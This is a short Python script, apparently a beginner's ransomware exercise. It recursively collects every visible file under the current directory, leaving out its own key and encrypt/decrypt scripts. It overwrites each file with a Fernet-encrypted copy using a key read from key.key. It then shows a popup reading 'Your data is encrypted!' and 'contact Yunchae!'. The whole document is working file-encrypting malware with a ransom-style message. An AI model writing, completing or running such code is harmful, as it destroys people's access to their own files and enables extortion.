# !usr/bin/env python3

import os

from cryptography.fernet import Fernet, InvalidToken

import tkinter as tk
from tkinter import messagebox

All_files = []

for root, dirs, files in os.walk("."):
    dirs[:] = [d for d in dirs if not d.startswith(".")]

    visible_file = [f for f in files if not f.startswith(".")]

    for thefile in visible_file:
            path = os.path.join(root,thefile)
            
            if path == "./encrypting.py" or path == "./key.key" or path == "./decrypting.py":
                continue
            All_files.append(path)

print(All_files)

key = Fernet.generate_key()

with open("key.key", "rb") as f:
    key = f.read()

with open("hello.txt", "rb") as f:
    content = f.read()


try:
    Fernet(key).decrypt(content)
    print("Already Fernet encrypted with this key")
except InvalidToken:
    
    with open("key.key", "wb") as thekey:
        thekey.write(key)

    for file in All_files:
        with open(file, "rb") as thefile:
            content = thefile.read()

        content_encrypted = Fernet(key).encrypt(content)

        with open(file, "wb") as thefile:
            thefile.write(content_encrypted)



root = tk.Tk()
root.withdraw()

messagebox.showinfo("Your data is encrypted!", "contact Yunchae!")